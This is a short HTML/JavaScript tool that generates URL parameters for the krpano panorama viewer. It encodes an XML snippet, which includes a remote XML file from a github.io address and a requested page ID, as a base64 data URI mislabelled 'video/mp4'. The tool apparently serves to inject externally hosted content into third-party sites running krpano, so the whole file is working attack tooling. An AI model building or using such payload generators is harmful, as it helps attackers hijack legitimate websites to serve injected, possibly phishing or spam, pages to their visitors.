
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>XML URL Generator</title>
<style>
body{font-family:Arial;max-width:850px;margin:30px auto;padding:15px}
input,textarea,button{box-sizing:border-box;width:100%;padding:12px;margin:8px 0 16px}
textarea{min-height:110px}
</style>
</head>
<body>
<h2>XML Base64 URL Generator</h2>

<label>XML File URL</label>
<input id="xmlUrl" value="https://hhtoplk.github.io/pages/tour/m.xml">

<label>HTML File ID</label>
<input id="pageId" placeholder="asdrfsdrfgthfgh">

<button id="generate">Generate URL</button>

<label>Generated URL</label>
<textarea id="result" readonly></textarea>
<button id="copy">Copy URL</button>

<script>
const $ = id => document.getElementById(id);

$("generate").onclick = () => {
  const xmlUrl = $("xmlUrl").value.trim();
  const id = $("pageId").value.trim();

  if (!xmlUrl || !/^[a-zA-Z0-9_-]+$/.test(id)) {
    alert("Enter a valid XML URL and HTML File ID.");
    return;
  }

  try {
    new URL(xmlUrl);
  } catch {
    alert("Enter a valid XML URL.");
    return;
  }

  const xml =
    '<krpano version="1.0.8.15">' +
    '<include url="' +
    xmlUrl.replace(/&/g, "&amp;").replace(/"/g, "&quot;") +
    '"/>' +
    '<data name="requested_html_id">' + id + '</data>' +
    '</krpano>';

  const base64 = btoa(xml);

  $("result").value =
    "&xml=data:video/mp4;base64," + base64 +
    "&id=" + encodeURIComponent(id);
};

$("copy").onclick = async () => {
  if (!$("result").value) {
    alert("Generate a URL first.");
    return;
  }
  try {
    await navigator.clipboard.writeText($("result").value);
    alert("Copied.");
  } catch {
    $("result").select();
    document.execCommand("copy");
  }
};
</script>
</body>
</html>
